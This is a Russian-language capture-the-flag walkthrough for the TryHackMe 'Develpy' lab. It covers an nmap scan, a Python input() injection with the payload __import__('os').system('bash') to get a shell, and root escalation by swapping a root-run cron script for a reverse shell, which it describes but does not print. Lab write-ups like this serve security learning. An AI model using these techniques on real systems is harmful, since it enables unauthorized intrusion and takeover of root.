# Develpy

:white_check_mark:  [**nc**](#nc)

:white_check_mark: [**python**](#python)

:white_check_mark: [**crontab**](#crontab)
___

## Разведка
Сканируем ip командой:
```
nmap -vv -p 1-10000 develpy.thm
```

```
PORT      STATE SERVICE          REASON                                                                  
22/tcp    open  ssh              syn-ack ttl 63                                                          
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63                                                          
                                                                                                         
Read data files from: /usr/bin/../share/nmap                                                         
```

<a name="nc"><h2>Получение оболочки</h2></a>

<a name="python"></a>

Взглянем на порт 10000. Попробуем подключиться по **nc**

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/develpy/1.png)

Мы имеем дело с программой на python и для ввода используется функция "**input()**". Можем попытаться запустить системную команду.

```
__import__("os").system("bash")
```
<a name="crontab"><h2>Повышение привилегий</h2></a>

Посмотрим что находится в crontab.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/develpy/2.png)

Файл root.sh запускается с правами root. Удаляем файл root.sh и записываем в новый обратную оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/develpy/3.png)

Немного ждем и получаем оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/develpy/4.png)
